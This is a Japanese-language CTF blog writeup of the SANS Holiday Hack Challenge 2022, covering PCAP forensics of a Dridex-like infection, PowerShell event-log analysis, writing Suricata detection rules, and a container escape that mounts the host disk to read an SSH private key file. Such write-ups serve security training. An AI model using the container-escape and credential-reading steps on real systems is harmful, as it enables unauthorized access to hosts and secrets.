---
title: "SANS Holiday Hack Challenge (Kringlecon) 2022 Writeup"
date: 2023-01-09T13:00:00+09:00
lastmod: 2023-01-09T13:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fkringlecon_2022%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2022.kringlecon.com/](https://2022.kringlecon.com/)
<br /><br />

新年明けまして おめでとうございます！

今年も SANS の Holiday Hack Challenge (Kringlecon) にちょっとだけ参加しました。

過去にも何度か参加してますが、チャレンジ文とヒントを別々に集めないといけなかったり、チャレンジを解くのにマップを移動しないといけない仕様が未だに慣れません。。。


<br />

進捗具合は以下の感じ。（各リングの全てのスクリーンショットを撮るのは面倒なので、Objectiveのトップ画面のみ）

<img src="https://captureamerica.github.io/writeups/img/kringlecon_2022_Objectives.png" alt="kringlecon_2022_Objectives.png">





<br />

<br /><br />
## Tolkien Ring - Wireshark Practice (Difficulty: 1)
- - -
### Challenge
> Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP.

Attachment:

- suspicious.pcap


<br />

### Solution
ターミナルに出てくる問題をひとつずつ解いていきます。

> 1. There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from the PCAP?

Answer: `http`

<br />

> 2. What is the file name of the largest file we can export?

Answer: `app.php`

<br />

> 3. What packet number starts that app.php file?

Answer: `687`

<br />

> 4. What is the IP of the Apache server?

Answer: `192.185.57.242`

<br />

> 5. What file is saved to the infected host?

Answer: `Ref_Sept24-2020.zip`

<br />

ちなみに、このpcapファイルからそのファイル自体を取り出すこともできます。<br/>

Frame 687にある、ここら辺です。

<img src="https://captureamerica.github.io/writeups/img/kringlecon_2022_wireshark1.png" alt="kringlecon_2022_wireshark1.png">

<br />
テキストファイルに落として、base64でデコードするだけです。思いっきりMalwareっぽいので取り扱いには要注意。

https://www.virustotal.com/gui/file/fad001d463e892e7844040cabdcfa8f8431c07e7ef1ffd76ffbd190f49d7693d/details <br/>
(VirusTotal Score: 45/69)


<br />

> 6. Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).

Wiresharkにて、`x509sat.CountryName`でフィルターすると、パケット数がだいぶ絞れます。

Server Hello内のCertificateを見ていくと、以下の4つの国コードが見つかります。<br/>
- US: United States
- IE: Ireland
- SS: South Sudan
- IL: Israel

Answer: `Ireland, Israel, South Sudan, United States`

<br />

> 7. Is the host infected (Yes/No)?

Answer: `Yes`


<br /><br />
<br /><br />
## Tolkien Ring - Windows Event Logs (Difficulty: 2)
- - -
### Challenge
> Investigate the Windows event log mystery in the terminal or offline.
<br /><br />
Hint: New to Windows event logs? Get a jump start with Eric's talk!
<br />
https://www.youtube.com/watch?v=5NZeHYPMXAE

Attachment:

- powershell.evtx


<br />

### Solution
まずは、Windowsマシンで上記ファイルを開き、powershelllogs.txt というファイル名でテキストとして保存しておきます。

次に、YouTubeビデオの通りにいくつかコマンドを実行してみます。

<pre>
PS C:\Users\XXX\Desktop> Get-Content .\powershelllogs.txt | where-object {$_ -match '[0-9]{1,2}/[0-9]{1,2}/[0-9]{4}'} | ForEach-Object{($_ -split "\s+")[1]} | Group-Object

Count Name                      Group
----- ----                      -----
 2088 12/13/2022                {12/13/2022, 12/13/2022, 12/13/2022, 12/13/2022...}
  181 12/4/2022                 {12/4/2022, 12/4/2022, 12/4/2022, 12/4/2022...}
 3540 12/24/2022                {12/24/2022, 12/24/2022, 12/24/2022, 12/24/2022...}
   36 12/18/2022                {12/18/2022, 12/18/2022, 12/18/2022, 12/18/2022...}
  240 11/11/2022                {11/11/2022, 11/11/2022, 11/11/2022, 11/11/2022...}
    1 Generated                 {Generated}
 1422 11/19/2022                {11/19/2022, 11/19/2022, 11/19/2022, 11/19/2022...}
 2811 12/22/2022                {12/22/2022, 12/22/2022, 12/22/2022, 12/22/2022...}
   36 11/25/2022                {11/25/2022, 11/25/2022, 11/25/2022, 11/25/2022...}
   46 10/13/2022                {10/13/2022, 10/13/2022, 10/13/2022, 10/13/2022...}
   34 10/31/2022                {10/31/2022, 10/31/2022, 10/31/2022, 10/31/2022...}
    4 name=""InputObject"";     {name=""InputObject"";, name=""InputObject"";, name=""InputObject"";, name=""InputObject"";}
    1 name=""Value"";           {name=""Value"";}


PS C:\Users\XXX\Desktop> $chrono = Get-Content -Path .\powershelllogs.txt
PS C:\Users\XXX\Desktop> [array]::Reverse($chrono)
PS C:\Users\XXX\Desktop> $chrono | Select-String "^\$" | more

$foo = Get-Content .\Recipe| % {$_-replace 'honey','fish oil'}
$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}
$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'
$OutputCollection | Sort-Object HotFixID | Format-Table -AutoSize
$OutputCollection += $output
$output | add-member NoteProperty "Title" -value $string
$output | add-member NoteProperty "HotFixID" -value $KB.` $_.Matches `.Value
$output = New-Object -TypeName PSobject
$KB = $string | Select-String -Pattern $regex | Select-Object {$_.Matches }
$Regex = "KB\d*"
$string = $update.title
$OutputCollection= @()
$all = $wu.QueryHistory(0,$totalupdates)
$totalupdates = $wu.GetTotalHistoryCount()
$wu = new-object -com "Microsoft.Update.Searcher"
$foo = Get-Content .\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'
$foo = Get-Content .\Recipe| % {$_-replace 'honey','fish oil'}
$foo | Add-Content -Path 'Recipe'
$global:?
$global:?
$global:?
$global:?
$foo | Add-Content -Path 'Recipe.txt'
$global:?
$global:?
$foo | Add-Content -Path 'Recipe.txt'
$foo | Add-Content -Path 'Recipe.txt'
$global:?
$global:?
$foo | Add-Content -Path 'recipe_updated.txt'
</pre>


<br />

この結果を元に、ターミナルに出てくる問題をひとつずつ解いていきます。結構、トライ＆エラーしました^^;

> 1. What month/day/year did the attacker take place? For example, 09/05/2021.

Answer: `12/24/2022`

<br />

> 2. An attacker got a secret from a file. What was the original file's name?

Answer: `Recipe`

(答えを部分的にしかチェックしていないのか、`Recipe.txt` でも正解とみなされます。。。)

<br />

> 3. The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions.

Answer: `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'`

<br />

> 4. After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action.

Answer: `$foo | Add-Content -Path 'Recipe'`

<br />

> 5. The attacker ran the previous command against one file multiple times. What is the name of this file?

Answer: `Recipe.txt`

<br />

> 6. Were any files deleted? (Yes/No)

Answer: `Yes`

<br />

> 7. Was the original file (from question 2) deleted? (Yes/No)

Answer: `No`

<br />

> 8. What is the Event ID of the logs that show the actual command lines the attacker typed and ran?

Answer: `4104`

<br />

> 9. Is the secret ingrediant compromised (Yes/No)?

Answer: `Yes`

<br />

> 10. What is the secret ingredient?

<img src="https://captureamerica.github.io/writeups/img/kringlecon_2022_eventlog.png" alt="kringlecon_2022_eventlog.png">

Answer: `1/2 tsp honey`



<br /><br />
<br /><br />
## Tolkien Ring - Suricata Regatta (Difficulty: 3)
- - -
### Challenge
> Help detect this kind of malicious activity in the future by writing some Suricata rules.
<br /><br />
Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves!
<br /><br />
There's a short list of rules started in suricata.rules in your home directory.

Attachment:

- suspicious.pcap


<br />

### Solution
ターミナルに入って、ホームディレクトリにあるサンプルを参考にルールを書いていきます。以下がサンプルです。

<pre>
elf@2971066f0db8:~$ cat suricata.rules
alert http any any -> any any (msg:"FILE tracking PNG (1x1 pixel) (1)"; filemagic:"PNG image data, 1 x 1,"; sid:19; rev:1;)
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING Possible ELF executable sent when remote host claims to send a Text File"; flow:established,from_server; http.header; content:"Content-Type|3a 20|text/plain"; file.data; content:"|7f 45 4c 46|"; startswith; fast_pattern; isdataat:3000,relative; classtype:bad-unknown; sid:2032973; rev:1; metadata:updated_at 2021_05_18;)
alert ip any any -> any any (msg:"SURICATA IPv4 invalid checksum"; ipv4-csum:invalid; classtype:protocol-command-decode; sid:2200073; rev:2;)
alert ip [199.184.82.0/24,199.184.223.0/24] any -> $HOME_NET any (msg:"ET DROP Spamhaus DROP Listed Traffic Inbound group 27"; reference:url,www.spamhaus.org/drop/drop.lasso; threshold: type limit, track by_src, seconds 3600, count 1; classtype:misc-attack; flowbits:set,ET.Evil; flowbits:set,ET.DROPIP; sid:2400026; rev:3398; metadata:updated_at 2022_10_06;)
alert dns $HOME_NET any -> any any (msg:"ET WEB_CLIENT Malicious Chrome Extension Domain Request (stickies .pro in DNS Lookup)"; dns.query; content:"stickies.pro"; nocase; sid:2025218; rev:4;)
alert tcp any any -> any any (msg:"SURICATA Applayer No TLS after STARTTLS"; flow:established; app-layer-event:applayer_no_tls_after_starttls; flowint:applayer.anomaly.count,+,1; classtype:protocol-command-decode; sid:2260004; rev:2;)
alert pkthdr any any -> any any (msg:"SURICATA IPv4 total length smaller than header size"; decode-event:ipv4.iplen_smaller_than_hlen; classtype:protocol-command-decode; sid:2200002; rev:2;)
alert udp any any -> any 123 (msg:"ET DOS Possible NTP DDoS Inbound Frequent Un-Authed GET_RESTRICT Requests IMPL 0x02"; content:"|00 02 10|"; offset:1; depth:3; byte_test:1,!&,128,0; byte_test:1,&,4,0; byte_test:1,&,2,0; byte_test:1,&,1,0; threshold: type both,track by_dst,count 2,seconds 60; classtype:attempted-dos; sid:2019021; rev:3; metadata:created_at 2014_08_26, updated_at 2014_08_26;)
</pre>

<br />

> First, please create a Suricata rule to catch DNS lookups for `adv.epostoday.uk`.
<br />
Whenever there's a match, the alert message (msg) should read `Known bad DNS lookup, possible Dridex infection`.
<br />
Add your rule to suricata.rules
<br /><br />
Once you think you have it right, run ./rule_checker to see how you've done!
<br />
As you get rules correct, rule_checker will ask for more to be added.

Suricataルールの書き方は少しググって調べました。

- sidはルールに付けるIDで必須らしいです。値自体は、Reserved for Local Use（1000000-1999999）からテキトーにピックアップ。

- revはそのルールのrevisionなのでテキトーに1にしてます。無くてもいいはず。



Answer:

`$ echo 'alert dns $HOME_NET any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk"; nocase; sid:1000000; rev:1;)' >> ./suricata.rules`


<br />

> STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242.
<br />
Develop a Suricata rule that alerts whenever the infected IP address `192.185.57.242` communicates with internal systems over HTTP.
<br />
When there's a match, the message (msg) should read `Investigate suspicious connections, possible Dridex infection`


Answer:

`$ echo 'alert http [192.185.57.242,$HOME_NET] any -> [192.185.57.242,$HOME_NET] any (msg:"Investigate suspicious connections, possible Dridex infection"; sid:1000001; rev:1;)' >> ./suricata.rules`


<br />

> We heard that some naughty actors are using TLS certificates with a specific `CN`.
<br />
Develop a Suricata rule to match and alert on an SSL certificate for `heardbellith.Icanwepeh.nagoya`.
<br />
When your rule matches, the message (msg) should read `Investigate bad certificates, possible Dridex infection`

Answer:

`$ echo 'alert tcp any any -> any any (msg:"Investigate bad certificates, possible Dridex infection"; tls.cert_subject; content:"CN=heardbellith.Icanwepeh.nagoya"; nocase; sid:1000002; rev:1;)' >> ./suricata.rules`

<br />

> OK, one more to rule them all and in the darkness find them.
<br />
Let's watch for one line from the JavaScript: `let byteCharacters = atob`
<br />
Oh, and that string might be GZip compressed - I hope that's OK!
<br />
Just in case they try this again, please alert on that HTTP data with message `Suspicious JavaScript function, possible Dridex infection`

以下を参考にしました。GZip圧縮されていたとしても単純に `http.response_body` でいいらしいです。
[https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html](https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html)

<br />

Answer:

`$ echo 'alert http any any -> any any (msg:"Suspicious JavaScript function, possible Dridex infection"; http.response_body; content:"let byteCharacters = atob"; nocase; sid:1000003; rev:1;)' >> ./suricata.rules`


<br /><br />
<br /><br />
## Elfen Ring - Prison Escape (Difficulty: 3)
- - -
### Challenge
> Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file `/home/jailer/.ssh/jail.key.priv`?


<br />

### Solution
ターミナルでアクセスできるのは、コンテナ内のCLIです。sudoで任意のコマンドが実行できます。

<pre>
grinchum-land:~$ sudo -l
User samways may run the following commands on grinchum-land:
    (ALL) NOPASSWD: ALL
</pre>

<br />

ゴールは、コンテナ内からホスト側にある`/home/jailer/.ssh/jail.key.priv`にアクセスすることです。
<br /><br />
以下のサイトを参考にしました。<br />
https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities <br />
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities <br />

<br>

`/proc/1/status`を見るといいらしいです。（たぶん）

<pre>
grinchum-land:~$ grep Cap /proc/1/status
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
</pre>

<br />

ターミナル上には`capsh`が入っていませんが、自分のKaliには入っていたので、どのフラグが立っているか確認してみました。

いっぱい出てきたし、出力結果はぶっちゃけ見てません^^;

たぶん全てのcapabilityがONなんだと思われます。

<pre>
captureamerica@kali:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
</pre>

<br />

fdiskコマンドでパーティションの確認をします。`/dev/vda`ですね。

<pre>
grinchum-land:~$ sudo fdisk -l
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes
</pre>

<br />

あとは、`mount`して該当ファイルを見るだけ。
<pre>
grinchum-land:~$ sudo mount /dev/vda /mnt/
grinchum-land:~$ cat /mnt/home/jailer/.ssh/jail.key.priv

                Congratulations! 

          You've found the secret for the 
          HHC22 container escape challenge!

                     .--._..--.
              ___   ( _'-_  -_.'
          _.-'   `-._|  - :- |
      _.-'           `--...__|
   .-'                       '--..___
  / `._                              \
   `. `._               one           |
     `. `._                           /
       '. `._    :__________....-----'
         `..`---'    |-_  _- |___...----..._
                     |_....--'             `.`.
               _...--'                       `.`.
          _..-'                             _.'.'
       .-'             step                _.'.'
       |                               _.'.'
       |                   __....------'-'
       |     __...------''' _|
       '--'''        |-  - _ |
               _.-''''''''''''''''''-._
            _.'                        |\
          .'                         _.' |
          `._          closer           |:.'
            `._                     _.' |
               `..__                 |  |
                    `---.._.--.    _|  |
                     | _   - | `-.._|_.'
          .--...__   |   -  _|
         .'_      `--.....__ |
        .'_                 `--..__
       .'_                         `.
      .'_    082bb339ec19de4935867   `-.
      `--..____                        _`.
               ```--...____          _..--'
                     | - _ ```---.._.'
                     |   - _ |
                     |_ -  - |
                     |   - _ |
                     | -_  -_|
                     |   - _ |
                     |   - _ |
                     | -_  -_|

</pre>

Answer: `082bb339ec19de4935867`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
